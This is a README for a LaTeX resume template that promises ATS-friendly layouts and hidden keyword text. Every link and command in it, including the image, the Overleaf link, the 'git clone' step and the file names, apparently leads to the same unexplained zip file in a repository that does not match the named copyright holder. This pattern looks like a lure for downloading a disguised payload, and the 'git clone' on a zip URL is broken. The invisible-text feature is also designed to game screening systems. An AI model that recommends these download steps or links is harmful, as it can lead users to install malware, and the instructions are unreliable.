<div align="center">

# resumeTeX

_Clean and simple LaTeX resume template for ATS system._

</div>

## About

ResumeTeX is a LaTeX resume template designed for ATS (application tracking system). It is clean and simple, with a focus on readability and ATS compatibility.

The template is designed to be easy to use and customize. It includes a number of components that can be easily added or removed.

## Idea

A common dilemma:  

- **Applicant**: I want my resume to pass ATS screening and impress human interviewers.  
- **Human Interviewer**: I want a well-crafted resume with no vague claims or exaggerations.  
- **ATS**: I filter out unqualified candidates using specific but hidden keywords.

However,

- To survive ATS screening, resumes need to include more keywords to increase the chances of matching.
- To impress human interviewers, resumes must be clear, concise, and reduce unnecessary information.

How to solve this dilemma?

- **Invisible text**: Include invisible text in the resume to improve ATS screening results.
- **Visible text**: Focus on the visible text to impress human interviewers.

_**Invisible text for ATS is meant to improve screening results. All information, visible or invisible, must be TRUE. Visible details should be those you want to discuss, while invisible ones should also be accurate but focus on optimizing keyword matches.**_

## Features

- ATS-friendly
  - [x] Invisible text for ATS systems
- Components
  - [x] Name
  - [x] Contact
  - [x] Section
  - [x] Tagline
    - [x] One-line tagline
    - [x] Dual-line tagline
  - [x] Bullet points
- UI
  - [x] Resume friendly font families
    - [x] Serif
      - [x] TeX Gyre Pagella style (Palatino alike)
      - [x] Times style (Times New Roman alike)
    - [ ] Sans-serif (yet to be tested, you may try)
  - [x] Industrial standard font sizes
  - [x] FontAwesome icons
  - [x] Colored text
    - [x] NTU Color Preset
- Multi-language support
  - [x] English
  - [ ] Chinese (ctex and XeLaTeX required, not implemented yet)

<div align="center">

![ATS Friendly English Resume](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip)

</div>

## Getting Started

It is recommended to use [Overleaf](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip), a cloud-based LaTeX editor. It is free for basic features and has a number of useful features, such as real-time collaboration and version control.

### Prerequisites

- pdfLaTeX

### Download

You may download the entire project directly from GitHub:

```shell
https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip
```

or clone the repository:

```shell
git clone https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip
```

Then you can open the project in your favorite LaTeX editor.

For English resume, edit `https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip` and compile it with pdfLaTeX.

For ATS invisible text, edit content following `% For ATS systems`.

### Usage

Please refer to the [usage of components](https://raw.githubusercontent.com/uwk2007/resumeTeX/master/nonnutrient/resumeTeX.zip).

## License

Copyright 2024 itdevwu.

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
